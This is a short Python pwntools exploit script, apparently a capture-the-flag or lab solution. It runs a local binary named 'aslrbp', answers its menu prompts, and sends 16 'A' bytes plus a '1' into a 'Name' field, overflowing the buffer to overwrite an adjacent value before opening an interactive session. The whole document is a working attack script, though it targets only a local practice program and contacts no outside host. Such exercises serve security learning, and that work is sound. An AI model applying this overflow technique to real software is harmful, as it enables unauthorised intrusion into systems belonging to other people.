from pwn import *

#context.log_level = "DEBUG"
p = process(["./aslrbp", "./1"])

paylaod = b"A"*16 + b"1"

p.sendlineafter(b"> ", b"1")
p.sendlineafter(b"Name:", paylaod)
p.sendlineafter(b"> ", b"3")


p.interactive()
